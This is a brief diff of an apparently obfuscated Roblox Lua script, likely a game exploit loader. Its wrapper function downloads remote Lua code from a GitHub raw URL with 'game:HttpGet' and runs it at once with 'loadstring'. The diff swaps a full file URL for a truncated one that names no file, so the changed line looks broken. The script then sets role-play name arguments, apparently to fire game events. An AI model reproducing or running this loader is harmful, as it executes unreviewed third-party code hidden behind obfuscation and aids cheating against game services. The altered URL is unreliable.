@@ -3,7 +3,7 @@
 local function obf_adjnqwidqwjhdpoq()
 	local function obf_wrapperfunc(obf_arg)
 		if obf_arg then
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/kigredns/icos/refs/heads/main/skibidisigma.lua"))();
+			loadstring(game:HttpGet("https://raw.githubusercontent.com/kigredns"))();
 			args = {
 				[1] = "RolePlayName",
 				[2] = "🐇Happy Easter🥚"
